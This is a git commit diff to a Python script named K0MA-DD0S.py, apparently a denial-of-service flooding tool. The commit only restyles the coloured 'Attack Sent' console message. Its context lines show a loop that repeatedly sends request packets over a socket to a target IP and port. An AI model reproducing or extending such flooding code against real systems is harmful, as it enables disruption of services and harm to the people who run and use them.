bbbc03546ccac96473b8adba2b54ae50e0e947a3
KunFay99 <kaffayukiffu@gmail.com>
2024-12-04 19:26:03 +0700

    Update K0MA-DD0S.py

--- K0MA-DD0S.py
+++ K0MA-DD0S.py
@@ -96,7 +96,7 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[★\033[96m]  \033[96m[KOMA]  \033[95m{2}  \033[33mAttack Sent  \033[92m{0}:{1}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[★\033[96m]  \033[96m[KOMA]  \033[37m{2}  \033[33m[Attack Sent]  \033[92m{0}:{1}\033[0m".format(str(ip), int(port), xx))
                 
         except:
                s.close()
